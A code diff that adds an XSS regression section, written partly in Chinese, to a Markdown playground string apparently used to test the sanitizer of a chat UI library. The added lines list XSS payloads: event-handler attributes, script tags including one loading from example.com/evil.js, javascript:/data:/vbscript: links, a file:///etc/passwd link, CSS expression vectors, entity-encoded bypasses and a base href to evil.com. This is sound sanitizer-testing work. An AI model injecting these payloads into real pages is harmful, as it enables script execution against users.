@@ -1179,6 +1179,7 @@ export const streamContent = `
 **Markdown 行内链接**：[腾讯蓝鲸](https://bk.tencent.com/) · [chat-x npm](https://www.npmjs.com/package/@blueking/chat-x)
 **Markdown 自动链接**：<https://github.com/TencentBlueKing/bk-aidev-agent>
 
+
 #### 3. Align content
 
 ::: hljs-left
@@ -1268,4 +1269,62 @@ git status
     function legacy() {
       return 'indented block';
     }
+
+---
+
+#### 5. XSS / HTML 注入风险回归（playground）
+
+以下用于验证 Markdown 渲染与 \`sanitizeHtmlFragment\` 等净化逻辑；**勿在生产会话中粘贴未信任内容**。
+
+**行内 / 块级 HTML（事件、可执行载体）**
+
+<img src=x onerror=alert(1)>
+<img src="x" onerror="alert(String.fromCharCode(88,83,83))">
+<svg/onload=alert(1)>
+<body onload=alert(1)>
+<input onfocus=alert(1) autofocus>
+<details open ontoggle=alert(1)>
+<marquee onstart=alert(1)>x</marquee>
+<script>alert('markdown-inline-script')</script>
+<script src="https://example.com/evil.js"></script>
+
+**危险协议与伪协议链接（Markdown 语法）**
+
+[javascript: 伪协议](javascript:alert(1))
+[javascript: 含空格绕过尝试](java script:alert(1))
+[data: HTML](data:text/html,<script>alert(1)</script>)
+[vbscript: 协议](vbscript:msgbox(1))
+[file: 协议](file:///etc/passwd)
+
+**原始 a / img / iframe / object**
+
+<a href="javascript:alert(1)">a href javascript</a>
+<a href="JavaScript:alert(1)">大小写混合 javascript</a>
+<a href="#" onclick="alert(1)">含 onclick 的 a</a>
+<a href="https://bk.tencent.com" onclick="alert(1)">合法 href + 事件属性</a>
+<img src="javascript:alert(1)" alt="img js src">
+<iframe src="javascript:alert(1)"></iframe>
+<object data="javascript:alert(1)"></object>
+<embed src="javascript:alert(1)">
+
+**style 与 CSS 注入（含 expression、url）**
+
+<div style="width:100px;height:100px;background:red">正常 style</div>
+<div style="background:url('javascript:alert(1)')">style url javascript</div>
+<div style="width:expression(alert(1))">IE expression（历史向量）</div>
+<div style="behavior:url(xss.htc)">behavior（IE）</div>
+
+**实体编码 / 混淆尝试（解析器差异）**
+
+<img src=x onerror&#61;"alert(1)">
+<a href="&#106;avascript:alert(1)">实体编码 javascript</a>
+
+**Markdown 自动链接角括号（若解析为链接需校验协议）**
+
+<javascript:alert(1)>
+<data:text/html,<base href=//evil.com/>>
+
+**「看起来像代码」但实际为 HTML 的行（非围栏块）**
+
+<code onclick="alert(1)">可点代码</code>
 `;
